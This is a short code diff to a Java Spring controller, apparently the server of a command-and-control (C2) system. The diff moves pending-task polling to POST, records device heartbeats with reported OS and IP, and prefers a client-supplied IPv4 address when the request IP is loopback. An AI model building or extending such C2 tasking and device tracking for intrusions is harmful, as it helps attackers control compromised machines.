@@ -38,10 +38,10 @@ public class C2Controller {
         return "alive";
     }
 
-    @GetMapping("/c2/tasks/pending")
-    public List<C2Task> getPendingTasks(HttpServletRequest request) {
+    @PostMapping("/c2/tasks/pending")
+    public List<C2Task> getPendingTasks(@RequestBody(required = false) Map<String, Object> payload, HttpServletRequest request) {
         // Record heartbeat (legacy support or just ip)
-        C2Device device = recordHeartbeat(null, request);
+        C2Device device = recordHeartbeat(payload, request);
         
         QueryWrapper<C2Task> queryWrapper = new QueryWrapper<>();
         queryWrapper.eq("status", "pending");
@@ -86,9 +86,26 @@ public class C2Controller {
             if (payload.containsKey("os")) {
                 os = (String) payload.get("os");
             }
-            // Use client reported IP if provided, otherwise stick to request IP
+            // Use client reported IP if provided and request IP is localhost/IPv6 loopback
              if (payload.containsKey("ip")) {
-                // ip = (String) payload.get("ip"); 
+                String clientIp = (String) payload.get("ip");
+                if (clientIp != null && !clientIp.isEmpty()) {
+                    if ("127.0.0.1".equals(ip) || "0:0:0:0:0:0:0:1".equals(ip) || "localhost".equals(ip)) {
+                         // Prefer first IPv4 if multiple
+                         String[] ips = clientIp.split(",");
+                         for (String i : ips) {
+                             i = i.trim();
+                             if (!i.isEmpty() && i.contains(".") && !i.contains(":")) {
+                                 ip = i;
+                                 break;
+                             }
+                         }
+                         // If no IPv4 found, just use the whole string or first one
+                         if ("127.0.0.1".equals(ip) || "0:0:0:0:0:0:0:1".equals(ip)) {
+                             ip = ips[0].trim();
+                         }
+                    }
+                }
              }
         }
 
